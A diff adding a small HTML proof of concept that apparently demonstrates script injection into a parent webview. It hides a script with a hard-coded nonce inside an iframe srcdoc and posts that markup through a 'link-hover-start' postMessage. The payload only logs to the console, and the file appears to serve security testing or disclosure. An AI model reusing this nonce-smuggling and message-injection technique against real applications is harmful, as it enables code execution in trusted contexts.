@@ -1,0 +1,21 @@
+<html>
+<head></head>
+<body>
+<h1>HELLO</h1>
+<pre id="exploit">
+<iframe srcdoc="
+<script nonce='QwK8qM1USqbuwHBpPfTrjuHl3AEDmKAcuoE45ppdYfD4dv998H3WKl2LVmWUlrvX'>
+console.log('PLACEHOLDER');
+</script>
+">
+</iframe>
+</pre>
+
+<script>
+window.parent.postMessage({
+command: 'link-hover-start',
+text: document.getElementById("exploit").innerHTML.replace("PLACEHOLDER", "HELLO!"),
+}, '*');
+</script>
+</body>
+</html>
